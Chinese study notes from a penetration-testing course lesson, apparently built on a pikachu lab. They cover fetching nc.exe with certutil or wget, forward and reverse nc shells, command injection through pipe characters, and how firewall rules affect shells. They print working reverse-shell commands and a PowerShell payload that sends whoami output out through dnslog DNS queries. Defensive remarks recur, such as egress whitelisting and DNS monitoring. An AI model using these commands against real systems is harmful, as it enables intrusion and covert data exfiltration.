## 二、核心知识点

### 1. 文件下载：无图形化下的工具投送（01:20-12:07）
- 场景：拿到的是命令执行点，没有桌面。想给目标装nc.exe，只能让**目标主动从你的服务器下载**——把自己的Web目录放好nc.exe，构造 `http://你的IP/nc.exe`（03:30-05:11）
- 命令不用背：用**棱角社区（ywhack）在线生成器**按系统生成（05:40-06:45）：
  - Windows：certutil、PowerShell 等（均内置）
  - Linux：wget、curl、python/ruby/perl 等
- 演示（07:27-10:54）：本机C盘执行certutil下载 → C盘多出nc.exe；PowerShell脚本亦可；Linux上wget/curl同理
- 坑点：命令看系统支持，Linux的命令搬到Windows就失效（11:06-11:34）；CMD里没有curl，PowerShell里才有（11:54-12:07）；**nc.exe默认不免杀**，实验得先关杀软（41:18-41:30）

> ⚔️ 安全思维：渗透的本质之一是"把目标变成你的下载客户端"。选下载命令前先判断对方操作系统——命令选型本身就是信息收集的一部分。

### 2. 反弹Shell是什么、为什么（12:11-16:50）
- 反弹模板极多（12:40-13:33）：bash/nc/ncat/telnet/perl/python/php/ruby/openssl/powershell/awk/java/MSF等，随取随用
- 工具nc：Linux自带nc/ncat；Windows不自带，要先下载nc.exe（13:34-14:05）
- 解决两个问题：
  1. **交互卡死**（14:13-15:37）：如 `useradd` 后 `passwd` 需要交互输入密码，Web漏洞点"一发一收"会话直接卡死；反弹回来=完整交互终端
  2. **维持权限**（15:50-16:25）：不必一次次提交命令，反弹回来"想敲就来"，等同本地操作，流量也从"反复HTTP请求"变成一条稳定连接

### 3. 正向 vs 反向：参照物问题（16:51-19:41）
- 正向=你主动连他（**他监听**）；反向=他主动连你（**你监听**）
- 正反只是相对参照物的说法，不必纠结；记住"监听方等待，连接方主动"（18:29-19:41）

### 4. 演示一：正向连接（19:44-25:24）
- Linux控Windows：Windows执行 `nc.exe -e cmd -lvp 5666`（把CMD绑定到5666监听）→ Linux `nc 47.122.23.131 5666`
- 现象：Linux侧出现 `（本地存档） 提示符，dir列的是Windows盘符 → **控制权移交成功**
- 反向操作：Linux `nc -lvp 5666 -e sh`，Windows `nc.exe LinuxIP 5666` → whoami在Linux上执行（23:52-25:17）
- 端口1-65535任选未占用即可（27:19-27:45）

> ⚔️ `-e` 的本质是把程序的输入输出接到socket上；正向的前提是你能"路由到达"目标的监听端口——这正是下面内网实验要打碎的假设。

### 5. 演示二：反向连接（28:11-31:41）
- 控制端 `nc -lvp 5666` 监听等待 → 目标 `nc -e cmd 你的IP 5666` 主动给出去
- 现象：监听端直接收到shell。与正向只是"谁监听、谁连接"对调

### 6. 为什么必须有反向：内网环境（33:00-43:35）★本集核心
- 内网：路由器NAT之下多机器共享一个公网出口IP（33:22-34:08）
- 正向为什么死（35:42-37:41）：公网IP只到路由器，路由器不知道转给内网哪台机器；内网IP（192.168.x.x）全球重复、不可寻址。除非在路由器上做**端口映射**（37:19-37:41）
- 宿舍类比：给宿舍楼地址找不到人，给个人门牌号才能精确找到（38:13-38:57）
- 实验（39:04-43:35）：虚拟机（192.168.1.107，经宿主机公网出口上网）+ Linux云服务器：
  - 正向连虚拟机内网IP:5666 → **超时连不上**（40:41-42:09）
  - 正向连虚拟机的公网出口IP:5666 → **照样失败**，监听不在路由器上（42:10-42:47）
  - 反向：虚拟机 `nc.exe -e cmd 云IP 5666`，云端 `nc -lvp 5666` → **成功拿到shell**（42:48-43:35）
- 反向场景总结："**他找不到你，你就找他**"（43:29-43:37）
- 反过来：内网机控公网Linux，正向可行——内网能主动出去（44:04-45:56）；双内网则需公网VPS做中转，两边都弹给中间人（45:59-46:30，内网课展开）

> ⚔️ 反弹shell大行其道不是因为"高级"，而是NAT+防火墙让入站天然不可达；你的公网VPS是唯一可寻址的锚点。防御视角：严格出站白名单才是掐断反弹的关键。

### 7. 实战串联：命令执行→管道符→下载→反弹（46:55-63:05）
- 靶场：pikachu的exec（ping 127.0.0.1 有回显）
- **管道符**（47:56-51:52）：Windows 4种（`& && | ||`），Linux 6种（多 `;` 分号和 `` ` ` `` 反引号）
  - `ping 127.0.0.1 | whoami` → 执行后面；`&&` 前成后行；`&` 前后都跑；`||` 前败才行
  - Linux `` ping 127.0.0.1; `whoami` `` → 输出里出现root；`pwd` 显示 /var/www/html
  - **Windows没有 `;` 和反引号**——这是后面带外的伏笔
- 利用链（52:08-55:24）：①回显含"Microsoft"判断是Windows → ②Windows无自带nc → ③用certutil把nc.exe下载到C盘（执行后自己服务器文件访问时间刷新，确认被拉走，55:02-55:11）→ ④再让nc执行反弹
- 正向（55:25-60:30）：靶机绑定5666 → 控制端连接成功，netstat可见5666监听与nc进程。插曲：直播间有人也连上了这个5666（"内鬼"，59:39-61:05）→ nc的shell**无认证，谁连谁用**
- 反向（61:06-62:44）：监听5666 → 靶机主动给出去 → 直接收到shell。无限制时正反皆可

> ⚔️ 反弹端口=无认证后门，可能被第三方抢连（老师当场翻车）；防御侧要监控异常监听端口和外联进程。

### 8. 防火墙出入站规则的影响（63:06-73:49）★数通主场
- 概念：入站=检查进来的流量，出站=检查出去的流量（63:06-63:41）
- 实验一 阻止**入站**TCP 5666（65:03-69:38）：正向（靶机绑定5666等连）→ 连接被拦失败；改反向（靶机主动出站）→ 成功
- 实验二 阻止**出站**5666（69:45-71:35）：反向"给出去"没反应→失败；正向也失败——因为**Windows防火墙默认策略：入站默认阻止（白名单制），出站默认允许**；nc.exe不在入站放行列表，连入的5666照样进不来；放行5666入站后正向成功（72:32-73:14）
- 一句话总结（73:51-74:31）："**他能不能找你，还是你找他**"——网络可达性决定正反选型

> ⚔️ 入站严/出站松 ⇒ 实战中反弹shell几乎是默认选择；防守方真正有效的是**出站白名单+DNS外联监控**。你有HCIA的ACL方向感，这节概念无缝迁移。

### 9. 不回显→带外查询 OOB（74:33-100:45）★今日亮点
- 模拟不回显（74:48-76:49）：注释掉靶场echo → 命令执行但页面零输出 → 两难：不确定有无漏洞/有漏洞看不到结果
- 方案A：反弹shell（76:49-77:20），直接弹回来就有完整回显
- 方案B：**带外查询**（77:21-78:46）——让目标主动把结果"带出来"：
  - dnslog平台申请子域名 → 目标 `ping xxx.dnslog.cn` → 平台刷新出现解析记录 = **命令执行实锤**
  - Linux：`` ping `whoami`.xxx.dnslog.cn `` → 记录前缀出现root，结果随域名带出
- Windows的坑（79:13-80:52）：CMD无反引号无分号，命令结果拼不进域名，写死的字符串只被当纯文本
- **PowerShell变量法**（81:01-91:39）：PowerShell是CMD升级版（Win7+内置），支持变量赋值：
  - `$x=whoami` 存结果；`$y='.xxx.dnslog.cn'`；`$z=$x+$y` 拼接
  - 坑：whoami结果含反斜杠（`desktop-xxx\administrator`），域名里不允许 `\` → 用 `replace('\','xxx')` 替换，xxx即分割标记（83:31-85:18）
  - 完整payload（85:39-87:53）：`ping 127.0.0.1 | powershell $x=whoami;$x=$x.replace('\','xxx');$y='.xxx.dnslog.cn';$z=$x+$y;ping $z`
  - 现象（88:01-91:39）：靶机页面依旧无输出，dnslog刷新后出现"结果xxx域名"记录 → **无回显下既确认执行又拿到结果**
  - 思路复盘（93:12-93:59）：漏洞点只接受ping IP → 管道符接PowerShell → 变量存结果 → 替换非法字符 → 拼域名 → ping触发DNS解析带出
- 本质（99:07-99:55）：带外=不回显时的"确认执行+取回数据"；前面学的命令全部在这一刻兑现价值
- 彩蛋（100:15-100:45）：ping/DNS解析走ICMP/DNS，防火墙针对TCP/UDP的过滤层级管不到它 → 天然能出去；与OSI分层有关，是内网隧道的伏笔，点到为止

> ⚔️ OOB对蓝队是检测金矿：盯异常子域名请求；攻击者把数据藏进域名前缀，检测就判断"域名前缀像不像数据"。
